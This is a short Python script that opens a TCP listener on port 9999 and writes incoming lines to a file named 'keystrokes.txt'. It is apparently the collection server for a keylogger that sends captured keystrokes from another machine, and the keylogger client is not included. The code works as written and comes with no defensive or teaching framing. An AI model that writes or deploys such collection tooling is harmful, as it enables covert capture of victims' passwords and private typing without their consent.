import socket

# Define server address and port
SERVER_HOST = ""  # Replace with your host machine's IP address
SERVER_PORT = 9999

# Create socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(1)

print("[*] Waiting for a connection...")
conn, addr = server_socket.accept()
print(f"[*] Connected to {addr}")

with open('keystrokes.txt', 'a') as file:
    buffer = ""
    while True:
        data = conn.recv(4096).decode()
        if not data:
            break
        buffer += data
        # Check for end of message
        if '\n' in buffer:
            parts = buffer.split('\n')
            for part in parts[:-1]:
                print(f"Received data: {part}")
                file.write(part + '\n')
            buffer = parts[-1]

conn.close()
server_socket.close()
